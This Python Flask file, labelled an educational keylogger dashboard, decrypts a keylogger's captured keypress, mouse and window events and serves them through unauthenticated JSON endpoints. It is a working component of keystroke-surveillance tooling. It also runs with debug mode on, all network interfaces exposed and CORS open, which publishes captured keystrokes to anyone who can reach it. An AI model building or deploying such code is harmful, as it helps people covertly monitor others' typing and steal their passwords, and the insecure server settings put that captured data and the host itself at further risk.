#!/usr/bin/env python3
"""
Dashboard Web para Keylogger Educativo
Autor: Alvaro Manzo

Servidor web para visualizar datos del keylogger de forma segura
"""

from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_cors import CORS
import json
import os
from datetime import datetime, timedelta
from pathlib import Path
import threading
from cryptography.fernet import Fernet

app = Flask(__name__)
CORS(app)

class KeyloggerDashboard:
    def __init__(self):
        self.load_cipher()
        
    def load_cipher(self):
        """Cargar clave de encriptación"""
        key_file = "keylogger.key"
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                key = f.read()
            self.cipher = Fernet(key)
        else:
            self.cipher = None
    
    def decrypt_data(self, data):
        """Desencriptar datos"""
        if self.cipher:
            try:
                return self.cipher.decrypt(data.encode()).decode()
            except:
                return data
        return data
    
    def get_log_data(self, hours=24):
        """Obtener datos de los logs"""
        log_file = "keylogger_data.enc"
        if not os.path.exists(log_file):
            return []
        
        events = []
        cutoff_time = datetime.now() - timedelta(hours=hours)
        
        try:
            with open(log_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    
                    try:
                        decrypted = self.decrypt_data(line)
                        event = json.loads(decrypted)
                        
                        # Filtrar por tiempo
                        event_time = datetime.fromisoformat(event['timestamp'])
                        if event_time > cutoff_time:
                            events.append(event)
                            
                    except Exception as e:
                        continue
        except Exception as e:
            print(f"Error leyendo logs: {e}")
        
        return events
    
    def get_statistics(self):
        """Obtener estadísticas generales"""
        events = self.get_log_data(hours=24)
        
        stats = {
            'total_events': len(events),
            'keypress_count': len([e for e in events if e['type'] == 'keypress']),
            'mouse_count': len([e for e in events if e['type'] == 'mouse']),
            'unique_windows': len(set([e.get('window', 'N/A') for e in events])),
            'events_by_hour': {}
        }
        
        # Eventos por hora
        for event in events:
            hour = datetime.fromisoformat(event['timestamp']).strftime('%H:00')
            stats['events_by_hour'][hour] = stats['events_by_hour'].get(hour, 0) + 1
        
        return stats

dashboard = KeyloggerDashboard()

@app.route('/')
def index():
    """Página principal del dashboard"""
    return render_template('dashboard.html')

@app.route('/api/stats')
def get_stats():
    """API para obtener estadísticas"""
    hours = request.args.get('hours', 24, type=int)
    stats = dashboard.get_statistics()
    return jsonify(stats)

@app.route('/api/events')
def get_events():
    """API para obtener eventos recientes"""
    hours = request.args.get('hours', 24, type=int)
    limit = request.args.get('limit', 100, type=int)
    
    events = dashboard.get_log_data(hours=hours)
    events = events[-limit:] if len(events) > limit else events
    
    return jsonify(events)

@app.route('/api/heatmap')
def get_heatmap():
    """API para datos del mapa de calor de actividad"""
    events = dashboard.get_log_data(hours=24)
    
    heatmap_data = {}
    for event in events:
        timestamp = datetime.fromisoformat(event['timestamp'])
        hour = timestamp.hour
        day = timestamp.strftime('%Y-%m-%d')
        
        key = f"{day}-{hour:02d}"
        heatmap_data[key] = heatmap_data.get(key, 0) + 1
    
    return jsonify(heatmap_data)

if __name__ == '__main__':
    print("""
    🌐 Keylogger Dashboard iniciado
    
    Accede a: http://localhost:5000
    
    Endpoints disponibles:
    - /api/stats - Estadísticas generales
    - /api/events - Eventos recientes
    - /api/heatmap - Mapa de calor de actividad
    """)
    
    app.run(debug=True, host='0.0.0.0', port=5000)
